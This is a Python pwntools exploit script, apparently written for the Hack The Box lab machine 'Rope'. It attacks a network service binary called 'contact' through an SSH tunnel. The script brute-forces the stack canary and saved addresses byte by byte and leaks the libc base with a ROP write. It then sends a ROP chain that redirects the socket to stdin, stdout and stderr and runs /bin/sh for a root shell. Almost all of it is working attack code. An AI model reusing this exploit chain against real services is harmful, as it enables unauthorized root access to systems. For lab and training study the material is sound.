#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
binary = context.binary = ELF('./contact')
# Libc from server (libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6)
libc = ELF('./libc.so.6', checksec=False)

host = "10.10.10.148" # "rope.htb"

# Setup io
def startup(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return remote('localhost', 1337, timeout=5)
    else:
        # Tunnel through SSH
        # Generate SSH-Key with: ssh-keygen -t rsa -b 4096 -m PEM -f id_rsa
        return ssh(user="r4j", host=host, keyfile="id_rsa")

# Connect to the service through ssh
def start(ssh):
    if args.LOCAL:
        return startup() # If local just connect to localhost
    return ssh.remote("127.0.0.1", 1337, timeout=5)

# Print startup logo
def print_logo():
    print("""   
    ______                                    _            _  _              
    | ___ \                                  | |          | || |             
    | |_/ / ___   _ __    ___   ______   ___ | |__    ___ | || |             
    |    / / _ \ | '_ \  / _ \ |_root_| / __|| '_ \  / _ \| || |             
    | |\ \| (_) || |_) ||  __/          \__ \| | | ||  __/| || |             
    \_| \_|\___/ | .__/  \___|          |___/|_| |_| \___||_||_|             
                 | |                                                         
    ______       |_| _____  _            _____         ____        _____      
    | ___ \         /  __ \| |          / __  \       / ___|      /  _  \     
    | |_/ / _   _   | /  \/| |__   _ __ | |/| |__  __/ /___   ___ | | | | ___ 
    | ___ \| | | |  | |    | '_ \ | '__|| |/| |\ \/ /| ___ \ / _ \| | | |/ __|
    | |_/ /| |_| |  | \__/\| | | || |   \ |_/ / >  < | \_/ ||  __/\ \_/ /\__ \\
    \____/  \__, |   \____/|_| |_||_|    \___/ /_/\_\\\_____/ \___| \___/ |___/
            __/  |                                                           
            |___/                                                            
    
    """)

#===========================================================
#                    EXPLOIT VARS
#===========================================================

#ropper --file contact
poprdi = 0x0164b #0x0164b: pop rdi; ret;
poprsi = 0x01649 #0x01649: pop rsi; pop r15; ret;                                                                            
poprdx = 0x01265 #0x01265: pop rdx; ret;
#write  = 0x0154e #0x0154e:  call 1050 <write@plt>

#===========================================================
#                    EXPLOIT FUNCTIONS
#===========================================================

# Clear num amounts of lines
def clear(num=1):
    for i in range(0,num):
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K")


# Print num amounts of empty lines
def empty(num=1):
    for i in range(0,num):
        print("")


# Bruteforce values byte-by-byte
def bf_value(ssh, type, payload):
    log.info("Starting to bruteforce %s..." % type)
    leak_value = b''
    empty(3) #Print empty line, so above output is not being cleared

    # Declare already known values here (don't need to re-bruteforce)
    if type == "canary":
        leak_value = p64(0xf1c69b1943149700)
    elif type == "rbp":
        leak_value = p64(0x7ffd7a57ae50)
    else: # ret
        leak_value = p64(0x55aab8bbe562)

    while len(leak_value) < 8:
        byte = 0
        while byte < 255:
            try:
                clear(2) # Clear to only show current byte
                log.info("Trying byte: " + hex(byte))
                io = start(ssh)
                data = b'A' * 0x38 + payload + leak_value + bytes([byte])
                io.sendafter("send to admin:", data)
                io.recvline()

                if "Done" in io.recvline().decode():
                    leak_value += bytes([byte])
                    clear(3) # Clear unimportant output
                    log.success("Got part of %s: %s" % (type,hex(u64(leak_value.ljust(8, b'\x00')))))
                    empty() #Print empty line, so status is not being cleared
                    io.close()
                    break
                else:
                    raise EOFError
            except EOFError:
                clear() # Clear old output
                byte += 1
                io.close()
    
    clear(5) # Clear previous output
    log.success("Got %s: %s" % (type,hex(u64(leak_value))))
    empty() #Print empty line, so above output is not being cleared
    return u64(leak_value)


# Leak libc base
def leak(ssh, canary, rbp, ret):
    binary.address = ret - 0x1562 # Offset from ret to PIE base
    rop = ROP([binary, libc])
    #clear(2)

    # call write(4, recv@got, 8);
    rop.raw(binary.address + poprdi)
    rop.raw(0x4) # fd
    rop.raw(binary.address + poprsi)
    rop.raw(binary.got['recv']) # function to leak, can be any function
    rop.raw(0x0) # for r15
    rop.raw(binary.address + poprdx)
    rop.raw(0x8) # 8 bytes
    rop.raw(binary.plt['write'])

    payload = b'A' * 0x38 + p64(canary) + p64(rbp) + bytes(rop)

    io = start(ssh)
    io.sendlineafter('admin:\n', payload)
    recv = u64(io.recv(8))
    libc.address = recv - libc.symbols['recv'] # Calculate offset

    clear(1)
    log.success("Leaked libc base: %s" % hex(libc.address))
    io.close()


# Generate ropchain to get shell
def genRopChain():
    rop = ROP([binary, libc])

    # Duplicate fd to redirect stdin, stdout and stderr to the socket
    # dup2(4, 0)
    rop.raw(rop.find_gadget(['pop rdi', 'ret']))
    rop.raw(0x4)
    rop.raw(rop.find_gadget(['pop rsi', 'ret']))
    rop.raw(0x0)
    rop.raw(libc.symbols['dup2'])

    # dup2(4, 1)
    # Don't pop rdi again, because it's already 4
    rop.raw(rop.find_gadget(['pop rsi', 'ret']))
    rop.raw(0x1)
    rop.raw(libc.symbols['dup2'])

    # dup2(4, 2)
    # Don't pop rdi again, because it's already 4
    rop.raw(rop.find_gadget(['pop rsi', 'ret']))
    rop.raw(0x2)
    rop.raw(libc.symbols['dup2'])

    # system('/bin/sh')
    binsh = next(libc.search(b'/bin/sh'))
    rop.system(binsh)  # execve('/bin/sh', 0, 0);
    return bytes(rop)


# Check we got interactive shell
def checkShell(shell):
    try:
        shell.sendline("id") # Send id to server
        id = shell.recvline().rstrip().decode() # Receive response

        # Check if we got a valid response
        if "uid=" in id:
            clear(2)
            log.success("Got shell as %s!" % id)
            return True # Got shell
        else:
            raise Exception
    except:
        clear(2)
        log.warning("Sees like we did not get a shell! DEBUG: %s" % id)
        return False # Did not get a shell


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Exploit the binary and get root shell
def exploit(canary="", rbp="", ret="", counter=0):
    try:
        # Get IO stream
        ssh = startup()
        #clear(7) # Clear ssh info

        # Brute force any unknown value
        if canary == "":
            canary = bf_value(ssh, "canary", b'')
        if rbp == "":
            rbp = bf_value(ssh, "rbp", p64(canary))
        if ret == "":
            ret = bf_value(ssh, "ret", p64(canary) + p64(rbp))

        # Leak libc
        leak(ssh, canary, rbp, ret)

        # Generate payload to get shell                # Redirect std to socket and run /bin/sh
        payload = b'A' * 0x38 + p64(canary) + p64(rbp) + genRopChain()

        # Send payload
        io = start(ssh)
        io.sendlineafter('admin:\n', payload)

        # Check if we get a shell
        if checkShell(io):
            io.interactive()
        else:
            raise Exception("Did not get shell!")
    except Exception as ex:
        counter += 1 # Update error counter
        log.debug("Exception: %s" % ex)
        if counter == 3:
            log.warning("Could not get a shell after 3 tries! Exiting...")
            sys.exit()
        # Rerun exploit with already known values (no bf needed again)
        exploit(canary, rbp, ret, counter)


if __name__ == "__main__":
    print_logo()
    exploit()